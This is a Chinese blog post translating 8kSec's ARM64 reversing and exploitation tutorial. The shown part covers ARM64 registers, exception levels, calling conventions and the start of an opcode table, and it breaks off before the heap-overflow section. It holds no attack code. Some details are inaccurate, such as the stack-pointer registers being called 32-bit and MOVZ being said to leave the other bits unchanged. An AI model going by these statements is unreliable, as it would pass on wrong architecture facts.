<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=Ecool><link href=../note-teezz/ rel=prev><link href=../arm64-reversing-and-exploitation-part-2/ rel=next><link rel=icon href=../../../../assets/favicon.ico><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.5.48"><title>ARM64逆向和利用 Part1——ARM指令集与简单堆溢出（笔记） - Ecool的知识花园</title><link rel=stylesheet href=../../../../assets/stylesheets/main.6f8fc17f.min.css><link rel=stylesheet href=../../../../assets/stylesheets/palette.06af60db.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Microsoft+Yahei:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Microsoft Yahei";--md-code-font:"JetBrains Mono"}</style><link rel=stylesheet href=../../../../css/extra.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/default.min.css><script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><link href=../../../../assets/stylesheets/glightbox.min.css rel=stylesheet><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style><script src=../../../../assets/javascripts/glightbox.min.js></script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#arm64 class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--shadow md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../../../.. title=Ecool的知识花园 class="md-header__button md-logo" aria-label=Ecool的知识花园 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Ecool的知识花园 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> ARM64逆向和利用 Part1——ARM指令集与简单堆溢出（笔记） </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media=(prefers-color-scheme) data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=blue-grey data-md-color-accent=indigo aria-label="Switch to system preference" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to system preference" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" title=分享 aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=清空当前内容 aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/jygzyc/Notes title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg> </div> <div class=md-source__repository> Ecool的知识花园 </div> </a> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../../../site-message/ class=md-tabs__link> 留言板 </a> </li> <li class=md-tabs__item> <a href=../../../../life/cuisine/discussion-6/ class=md-tabs__link> 生活 </a> </li> <li class=md-tabs__item> <a href=../../../../essay/article/discussion-5/ class=md-tabs__link> 随笔 </a> </li> <li class=md-tabs__item> <a href=../../../../technology/android/kernel/discussion-18/ class=md-tabs__link> 技术 </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../../../ class=md-tabs__link> 博客 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation hidden> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../.. title=Ecool的知识花园 class="md-nav__button md-logo" aria-label=Ecool的知识花园 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> Ecool的知识花园 </label> <div class=md-nav__source> <a href=https://github.com/jygzyc/Notes title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg> </div> <div class=md-source__repository> Ecool的知识花园 </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../.. class=md-nav__link> <span class=md-ellipsis> 主页 </span> </a> </li> <li class=md-nav__item> <a href=../../../../site-message/ class=md-nav__link> <span class=md-ellipsis> 留言板 </span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../../../life/cuisine/discussion-6/ class=md-nav__link> <span class=md-ellipsis> 生活 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../../../essay/article/discussion-5/ class=md-nav__link> <span class=md-ellipsis> 随笔 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../../../technology/android/kernel/discussion-18/ class=md-nav__link> <span class=md-ellipsis> 技术 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_6 checked> <div class="md-nav__link md-nav__container"> <a href=../../../ class="md-nav__link "> <span class=md-ellipsis> 博客 </span> </a> <label class="md-nav__link " for=__nav_6 id=__nav_6_label tabindex> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_6_label aria-expanded=true> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> 博客 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_6_2> <label class=md-nav__link for=__nav_6_2 id=__nav_6_2_label tabindex> <span class=md-ellipsis> 归档 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_6_2_label aria-expanded=false> <label class=md-nav__title for=__nav_6_2> <span class="md-nav__icon md-icon"></span> 归档 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../archive/2024/ class=md-nav__link> <span class=md-ellipsis> 2024 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_6_3> <label class=md-nav__link for=__nav_6_3 id=__nav_6_3_label tabindex> <span class=md-ellipsis> 分类 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_6_3_label aria-expanded=false> <label class=md-nav__title for=__nav_6_3> <span class="md-nav__icon md-icon"></span> 分类 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../category/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E8%BD%BD/ class=md-nav__link> <span class=md-ellipsis> 博客转载 </span> </a> </li> <li class=md-nav__item> <a href=../../../category/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ class=md-nav__link> <span class=md-ellipsis> 安全技术 </span> </a> </li> <li class=md-nav__item> <a href=../../../category/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/ class=md-nav__link> <span class=md-ellipsis> 论文笔记 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#arm64 class=md-nav__link> <span class=md-ellipsis> ARM64 介绍 </span> </a> </li> <li class=md-nav__item> <a href=#arm64_1 class=md-nav__link> <span class=md-ellipsis> ARM64寄存器 </span> </a> </li> <li class=md-nav__item> <a href=#arm64_2 class=md-nav__link> <span class=md-ellipsis> ARM64 调用约定 </span> </a> </li> <li class=md-nav__item> <a href=#arm64-opcodes class=md-nav__link> <span class=md-ellipsis> ARM64 Opcodes </span> </a> </li> <li class=md-nav__item> <a href=#_1 class=md-nav__link> <span class=md-ellipsis> 系统寄存器 </span> </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> <span class=md-ellipsis> 读/写系统寄存器 </span> </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> <span class=md-ellipsis> 函数头/尾 </span> </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> <span class=md-ellipsis> 例子 </span> </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> <span class=md-ellipsis> 一个简单的堆溢出 </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-content md-content--post" data-md-component=content> <div class="md-sidebar md-sidebar--post" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class="md-sidebar__inner md-post"> <nav class="md-nav md-nav--primary"> <div class=md-post__back> <div class="md-nav__title md-nav__container"> <a href=../../../ class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> <span class=md-ellipsis> 回到主页 </span> </a> </div> </div> <div class="md-post__authors md-typeset"> <div class="md-profile md-post__profile"> <span class="md-author md-author--long"> <img src=https://avatars.githubusercontent.com/u/33087260 alt=Ecool> </span> <span class=md-profile__description> <strong> <a href=https://github.com/jygzyc>Ecool</a> </strong> <br> Creator </span> </div> </div> <ul class="md-post__meta md-nav__list"> <li class="md-nav__item md-nav__item--section"> <div class=md-post__title> <span class=md-ellipsis> 元数据 </span> </div> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg> <time datetime="2024-08-02 00:00:00+00:00" class=md-ellipsis>2024年8月2日</time> </div> </li> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M15 13h1.5v2.82l2.44 1.41-.75 1.3L15 16.69zm4-5H5v11h4.67c-.43-.91-.67-1.93-.67-3a7 7 0 0 1 7-7c1.07 0 2.09.24 3 .67zM5 21a2 2 0 0 1-2-2V5c0-1.11.89-2 2-2h1V1h2v2h8V1h2v2h1a2 2 0 0 1 2 2v6.1c1.24 1.26 2 2.99 2 4.9a7 7 0 0 1-7 7c-1.91 0-3.64-.76-4.9-2zm11-9.85A4.85 4.85 0 0 0 11.15 16c0 2.68 2.17 4.85 4.85 4.85A4.85 4.85 0 0 0 20.85 16c0-2.68-2.17-4.85-4.85-4.85"/></svg> <time datetime="2024-08-06 00:00:00+00:00" class=md-ellipsis>2024年8月6日</time> </div> </li> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg> <span class=md-ellipsis> 分类于 <a href=../../../category/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E8%BD%BD/ >博客转载</a>, <a href=../../../category/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ >安全技术</a></span> </div> </li> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg> <span class=md-ellipsis> 需要 5 分钟阅读时间 </span> </div> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <article class="md-content__inner md-typeset"> <a href=https://github.com/jygzyc/Notes/edit/master/docs/blog/posts/arm64-reversing-and-exploitation-part-1.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg> </a> <a href=https://github.com/jygzyc/Notes/raw/master/docs/blog/posts/arm64-reversing-and-exploitation-part-1.md title=查看本页的源代码 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg> </a> <h1>ARM64逆向和利用 Part1——ARM指令集与简单堆溢出（笔记）</h1> <!-- arm64_reversing_and_exploitation_part_1 --> <blockquote> <p>翻译自<a href=https://8ksec.io/arm64-reversing-and-exploitation-part-1-arm-instruction-set-simple-heap-overflow/ >ARM64 Reversing And Exploitation Part 1 – ARM Instruction Set + Simple Heap Overflow | 8kSec Blogs</a>，同时修改部分内容</p> </blockquote> <p>在本博客系列中，我们将了解 ARM 指令集并使用它来逆向 ARM 二进制文件，然后为它们编写漏洞利用程序。那么让我们从 ARM64 的基础知识开始吧。</p> <!-- more --> <h2 id=arm64>ARM64 介绍<a class=headerlink href=#arm64 title="Permanent link">&para;</a></h2> <p>ARM64 是 RISC（精简指令集计算机）架构系列。RISC区别于其他架构的特点是使用了小型、高度优化的指令集，而不是其他类型的架构（例如 CISC）中常见的更专业的指令集。 ARM64 遵循Load/Store方法，其中操作数和目标都必须位于寄存器中。加载-存储架构是一种指令集架构，它将指令分为两类：内存访问（内存和寄存器之间的加载和存储）和ALU操作（仅发生在寄存器之间）。这与寄存器-内存架构（例如，诸如x86的CISC指令集架构）不同，举例来说，在寄存器-内存架构中，用于ADD操作的操作数之一可能位于存储器中，而另一个位于寄存器中。使用ARM架构非常适合移动设备，因为RISC架构需要很少的晶体管，因此可以减少设备的功耗和发热，从而延长电池寿命，这对于移动设备至关重要。</p> <p>目前的iOS和Android手机都使用ARM处理器，较新的手机具体使用ARM64。因此，逆向 ARM64 汇编代码对于理解二进制文件或任何二进制文件/应用程序的内部工作原理至关重要。本博客系列不可能涵盖整个 ARM64 指令集，因此我们将重点关注最有用的指令和最常用的寄存器。还需要注意的是，ARM64 也称为 ARMv8（8.1、8.3 等），而 ARM32 则称为 ARMv7。</p> <p>ARMv8 (ARM64) 通过使用两种执行状态 —— AArch32 和 AArch64 来保持与现有 32 位架构的兼容性。在AArch32状态下，处理器只能访问32位寄存器。在AArch64状态下，处理器可以访问32位和64位寄存器。 ARM64有几个通用和专用寄存器。通用寄存器是那些没有附加作用的寄存器，因此可以被大多数指令使用。人们可以用它们进行算术运算，将它们用作内存地址，等等。特殊用途寄存器也没有附加作用，但只能用于某些目的并且只能由某些指令使用。其他指令可能隐式依赖于它们的值。堆栈指针寄存器就是一个例子。然后我们有控制寄存器——这些寄存器有附加作用。在 ARM64 上，这些寄存器类似于 TTBR（转换表基址寄存器），它保存当前页表的基址指针。其中许多将具有特权并且只能由内核代码使用。然而，某些控制寄存器可供任何人使用。在下图中我们可以看到 XNU 内核的一些控制寄存器。</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-001.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt="Example of some control registers used in the iOS kernel" src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-001.png></a></p> <p>现代操作系统被定义拥有多个特权级别，可用于控制对资源的访问。内核和用户空间之间的划分就是一个例子。 Armv8 通过实施不同级别的特权来实现这种划分，这些级别在 Armv8-A 架构中称为异常级别。 ARMv8 有多个编号的异常级别（EL0、EL1 等），编号越高，权限越高。当发生异常时，异常级别可以增加或保持不变。然而，当从异常返回时，异常级别可以降低或保持不变。执行状态（AArch32 或 AArch64）可以通过获取异常或从异常返回来进行变更。上电时，设备进入最高异常级别。</p> <p><a class=glightbox href=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-002.png data-type=image data-width=auto data-height=auto data-desc-position=bottom><img alt="Example of Exception levels in ARM" src=https://bucket.lilac.fun/2024/08/arm64_reversing_and_exploitation_part_1-002.png></a></p> <h2 id=arm64_1>ARM64寄存器<a class=headerlink href=#arm64_1 title="Permanent link">&para;</a></h2> <p>以下列表定义了不同的 ARM64 寄存器及其用途</p> <ul> <li>x0-x30 是 64 位通用寄存器。它们的下半部分可以通过 w0-w30 访问。</li> <li>有四个堆栈指针寄存器SP_EL0、SP_EL1、SP_EL2、SP_EL3（每个用于不同的执行级别），均为32位宽。除此之外，还有 3 个异常链接寄存器 ELR_EL1、ELR_EL2、ELR_EL3，3 个保存程序状态寄存器 SPSR_EL1、SPSR_EL2、SPSR_EL3 和 1 个程序计数器寄存器 (PC)。</li> <li>Arm 还使用 PC 相对寻址——其中指定相对于 PC 的操作数地址（基地址）——这有助于执行内存位置不相关的代码。</li> <li>在 ARM64 中（与 ARM32 不同），大多数指令无法访问 PC，尤其是不能直接访问。PC只能够被间接修改，例如使用跳转或堆栈相关指令。</li> <li>类似的，SP（堆栈指针）寄存器永远不会被隐式修改（例如使用 push/pop 调用）。</li> <li>当前程序状态寄存器 (CPSR) 保存与 APSR 相同的程序状态标志以及一些附加信息。</li> <li>opcode中的第一个寄存器通常是目标，其余是源（str、stp 除外）</li> </ul> <table> <thead> <tr> <th>寄存器</th> <th>用途</th> </tr> </thead> <tbody> <tr> <td>x0 -x7</td> <td>参数（最多 8 个），剩余参数将位于堆栈上</td> </tr> <tr> <td>x8 -x18</td> <td>通用，保存变量。从函数返回时不能做出任何假设</td> </tr> <tr> <td>x19 -x28</td> <td>如果被函数使用，则必须保留它们的值，并在返回给调用者时恢复</td> </tr> <tr> <td>x29 (fp)</td> <td>帧指针（指向栈帧底部）</td> </tr> <tr> <td>x30 (lr)</td> <td>链接寄存器，保存函数调用的返回地址</td> </tr> <tr> <td>x16</td> <td>用于系统调用，即 SVC（0x80）call</td> </tr> <tr> <td>x31 (sp/(x/w)zr)</td> <td>堆栈指针 (sp) 或零寄存器（xzr 或 wzr）</td> </tr> <tr> <td>PC</td> <td>程序计数器寄存器。包含下一条要执行的指令的地址</td> </tr> <tr> <td>APSR / CPSR</td> <td>当前程序状态寄存器（保存标志）</td> </tr> </tbody> </table> <h2 id=arm64_2>ARM64 调用约定<a class=headerlink href=#arm64_2 title="Permanent link">&para;</a></h2> <ul> <li>函数参数在 x0-x7 寄存器中传递，其余在堆栈上传递</li> <li>ret命令用于返回Link寄存器中的地址（默认值为x30）</li> <li>函数的返回值存储在 x0 或 x0+x1 中，具体取决于其是 64 位还是 128 位</li> <li>x8是间接结果寄存器，用于传递间接结果的地址位置，例如，函数返回一个大结构体</li> <li>函数分支跳转时会使用 B opcode</li> <li>带链接的子程序跳转 (BL) 在跳转分支之前会将下一条指令的地址（BL 之后）复制到链接寄存器 (x30)</li> <li>如上所述， BL 用于子程序调用</li> <li>BR 调用用于跳转寄存器中记录的子程序，例如 br x8</li> <li>BLR 代码用于跳转到寄存器中地址子程序，并将下一条指令（BL之后）的地址存储到链接寄存器（x30）中</li> </ul> <h2 id=arm64-opcodes>ARM64 Opcodes<a class=headerlink href=#arm64-opcodes title="Permanent link">&para;</a></h2> <table> <thead> <tr> <th><strong>操作码</strong></th> <th><strong>用途</strong></th> </tr> </thead> <tbody> <tr> <td>MOV</td> <td>将一个寄存器中的值移至另一个寄存器</td> </tr> <tr> <td>MOVN</td> <td>将负值移至寄存器</td> </tr> <tr> <td>MOVK</td> <td>将 16 位立即数移入寄存器，其余部分保持不变</td> </tr> <tr> <td>MOVZ</td> <td>移动已移位的 16 位到寄存器，其余保持不变</td> </tr> <tr> 